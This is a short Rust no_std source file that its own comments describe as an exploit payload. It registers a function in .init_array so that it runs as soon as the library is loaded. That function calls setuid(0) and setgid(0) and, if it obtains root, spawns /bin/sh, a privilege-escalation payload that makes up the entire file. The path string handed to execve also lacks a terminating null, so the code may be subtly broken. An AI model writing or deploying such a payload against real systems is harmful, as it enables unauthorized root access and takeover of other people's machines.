#![no_std]

use core::arch::asm;


#[panic_handler]
fn panic(_: &core::panic::PanicInfo) -> ! {
    loop {}
}

//stdout fd
const STDOUT: u64 = 1;
// syscall numbers
const SYS_WRITE: u64 = 1;
const SYS_EXIT: u64 = 60;
const SYS_SETUID: u64 = 105;
const SYS_SETGID: u64 = 106;
const SYS_GETUID: u64 = 102;
const SYS_EXECVE: u64 = 59;


unsafe fn syscall_0(syscall_n: u64) -> u64 {
    let ret: u64;

    asm!(
        "syscall",
        in("rax") syscall_n,
        out("rcx") _,
        out("r11") _,
        lateout("rax") ret,
        options(nostack)
    );

    ret
}


unsafe fn syscall_1(syscall_n: u64, arg1: u64) -> u64 {
    let ret: u64;

    asm!(
        "syscall",
        in("rax") syscall_n,
        in("rdi") arg1,
        out("rcx") _,
        out("r11") _,
        lateout("rax") ret,
        options(nostack)
    );

    ret
}


unsafe fn syscall_3(syscall_n: u64, arg1: u64, arg2: u64, arg3: u64) -> u64 {
    let ret: u64;

    asm!(
        "syscall",
        in("rax") syscall_n,
        in("rdi") arg1,
        in("rsi") arg2,
        in("rdx") arg3,
        out("rcx") _,
        out("r11") _,
        lateout("rax") ret,
        options(nostack)
    );

    ret
}


//since exploit needs to execute function when library is loaded, so we put a pointer to rust_init() in .init_array
pub static INIT: unsafe extern "C" fn() = rust_init;


//actual payload
#[no_mangle]
pub unsafe extern "C" fn rust_init() {
    let msg = "[+] Rust Payload\n";

    syscall_3(SYS_WRITE, STDOUT, msg.as_ptr() as u64, msg.len() as u64);

    syscall_1(SYS_SETUID, 0);
    syscall_1(SYS_SETGID, 0);

    if syscall_0(SYS_GETUID) == 0 {
        let msg = "[+] You are Rick";

        syscall_3(SYS_WRITE, STDOUT, msg.as_ptr() as u64, msg.len() as u64);

        let cmd = "/bin/sh";
        syscall_3(SYS_EXECVE, cmd.as_ptr() as u64, 0, 0);
    } else {
        let msg = "[-] You are Morty";

        syscall_3(SYS_WRITE, STDOUT, msg.as_ptr() as u64, msg.len() as u64);
    }

    syscall_1(SYS_EXIT, 0);
}
